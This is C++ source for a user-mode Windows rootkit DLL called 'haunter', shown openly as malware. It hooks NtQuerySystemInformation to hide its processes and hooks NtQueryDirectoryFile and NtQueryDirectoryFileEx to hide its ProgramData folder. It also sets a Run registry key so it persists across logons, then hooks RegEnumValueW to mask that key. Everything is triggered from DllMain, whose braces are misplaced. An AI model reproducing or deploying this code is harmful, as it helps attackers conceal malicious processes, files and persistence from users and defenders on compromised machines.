// haunter ring 3 rootkit

#include <ntstatus.h>
#include <winternl.h>
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <WinIoCtl.h>
#include <iostream>
#include <thread>
#include <Strsafe.h>
#include <tchar.h>
#include <fileapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <vector>
#include <fstream>
#include <ShlObj.h>
#include <string>
#include <string_view>
#include <algorithm>
#include <urlmon.h>
#include <Shellapi.h>
#include <cstring>
#include <cstdlib>

#include "pch.h"
#include "nt_structs.hpp"
#include "MinHook.hpp"
#include <Urlmon.h>

#pragma comment(lib, "Strsafe.lib")
#pragma comment(lib, "Shlwapi")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "libMinHook.x64.lib")
extern const wchar_t* PathHide;
const wchar_t* PathHide = L"C:\\ProgramData\\haunter\\";
#define STATUS_NO_MORE_FILES ((NTSTATUS)0x80000002L)

PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation;
PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation;
wchar_t* process;

NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS stat = New_NtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && stat == 0)
    {
        P_SYSTEM_PROCESS_INFORMATION prev = P_SYSTEM_PROCESS_INFORMATION(SystemInformation);
        P_SYSTEM_PROCESS_INFORMATION curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);
        while (prev->NextEntryOffset != NULL) {
            if (!lstrcmp(curr->ImageName.Buffer, L"haunter.exe") || !lstrcmp(curr->ImageName.Buffer, L"haunter1.exe") || !lstrcmp(curr->ImageName.Buffer, L"haunter2.exe")) {
                if (curr->NextEntryOffset == 0) {
                    prev->NextEntryOffset = 0;
                }
                else {
                    prev->NextEntryOffset += curr->NextEntryOffset;
                }
                curr = prev;
            }
            prev = curr;
            curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
        }
    }

    return stat;
}

bool set_nt_hook()
{
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");

    Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");

    if (MH_Initialize() != MH_OK) { return false; }

    if (MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
        (LPVOID*)&New_NtQuerySystemInformation) != MH_OK) {
        return false;
    }

    if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) { return false; }

    return true;
}

typedef NTSTATUS(WINAPI* PNT_QUERY_DIRECTORY_FILE)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
    );

typedef NTSTATUS(WINAPI* PNT_QUERY_DIRECTORY_FILE_EX)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG QueryFlags,
    PUNICODE_STRING FileName
    );

PNT_QUERY_DIRECTORY_FILE Original_NtQueryDirectoryFile;
PNT_QUERY_DIRECTORY_FILE New_NtQueryDirectoryFile;

PNT_QUERY_DIRECTORY_FILE_EX Original_NtQueryDirectoryFileEx;
PNT_QUERY_DIRECTORY_FILE_EX New_NtQueryDirectoryFileEx;

NTSTATUS WINAPI Hooked_NtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
)
{
    if (FileName && FileName->Buffer &&
        wcsstr(FileName->Buffer, PathHide) != nullptr)
    {
        RtlZeroMemory(FileInformation, Length);
        return STATUS_NO_MORE_FILES; 
    }

    return Original_NtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
}

NTSTATUS WINAPI Hooked_NtQueryDirectoryFileEx(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG QueryFlags,
    PUNICODE_STRING FileName
)
{
    if (FileName && FileName->Buffer &&
        wcsstr(FileName->Buffer, PathHide) != nullptr)
    {
        RtlZeroMemory(FileInformation, Length);
        return STATUS_NO_MORE_FILES; 
    }

    return Original_NtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
}


bool set_directory_hooks()
{
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    Original_NtQueryDirectoryFile = (PNT_QUERY_DIRECTORY_FILE)GetProcAddress(ntdll, "NtQueryDirectoryFile");

    if (MH_Initialize() != MH_OK) { return false; }

    if (MH_CreateHook(Original_NtQueryDirectoryFile, &Hooked_NtQueryDirectoryFile,
        (LPVOID*)&New_NtQueryDirectoryFile) != MH_OK) {
        return false;
    }

    if (MH_EnableHook(Original_NtQueryDirectoryFile) != MH_OK) { return false; }

    Original_NtQueryDirectoryFileEx = (PNT_QUERY_DIRECTORY_FILE_EX)GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
    if (MH_CreateHook(Original_NtQueryDirectoryFileEx, &Hooked_NtQueryDirectoryFileEx,
        (LPVOID*)&New_NtQueryDirectoryFileEx) != MH_OK) {
        return false;
    }

    if (MH_EnableHook(Original_NtQueryDirectoryFileEx) != MH_OK) { return false; }

    return true;
}

bool CreateDirectoryIfNotExists()
{
    if (CreateDirectory(PathHide, nullptr) || GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return true;
    }
    else
    {
        return false;
    }
}

bool CreateRegistryKey()
{
    HKEY hKey;
    LPCWSTR subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR valueName = L"haunter";

    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey);

    if (result != ERROR_SUCCESS)
    {
        return false;
    }


    wchar_t dllPath[MAX_PATH];
    GetModuleFileName(NULL, dllPath, MAX_PATH);

    result = RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t));

    RegCloseKey(hKey);

    return result == ERROR_SUCCESS;
}

typedef LSTATUS(WINAPI* PREG_ENUM_VALUEW)(
    HKEY    hKey,
    DWORD   dwIndex,
    LPWSTR  lpValueName,
    LPDWORD lpcchValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE  lpData,
    LPDWORD lpcbData
    );

PREG_ENUM_VALUEW Original_RegEnumValueW;

LSTATUS WINAPI Hooked_RegEnumValueW(
    HKEY    hKey,
    DWORD   dwIndex,
    LPWSTR  lpValueName,
    LPDWORD lpcchValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE  lpData,
    LPDWORD lpcbData
)
{
    LSTATUS result = Original_RegEnumValueW(hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData);
    if (result == ERROR_SUCCESS && lpValueName && lstrcmp(lpValueName, L"haunter") == 0)
    {
        lstrcpy(lpValueName, L"");
    }

    return result;
}

bool set_reg_enum_value_hook()
{
    HMODULE hAdvApi32 = GetModuleHandle(L"advapi32.dll");

    if (!hAdvApi32)
        return false;

    Original_RegEnumValueW = (PREG_ENUM_VALUEW)GetProcAddress(hAdvApi32, "RegEnumValueW");

    if (MH_Initialize() != MH_OK)
        return false;

    if (MH_CreateHook(Original_RegEnumValueW, &Hooked_RegEnumValueW, (LPVOID*)&Original_RegEnumValueW) != MH_OK)
        return false;

    if (MH_EnableHook(Original_RegEnumValueW) != MH_OK)
        return false;

    return true;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        if (!set_nt_hook()) {
            return FALSE;
        }
        CreateDirectoryIfNotExists();
        if (!set_directory_hooks()) {
            return FALSE;
        }
        if (!CreateRegistryKey())
        {
            return FALSE;
        }


        if (!set_reg_enum_value_hook())
        {
            return FALSE;

            break;
    case DLL_PROCESS_DETACH:
        MH_DisableHook(Original_NtQuerySystemInformation);
        MH_Uninitialize();
        break;
        }

        return TRUE;
    }
}
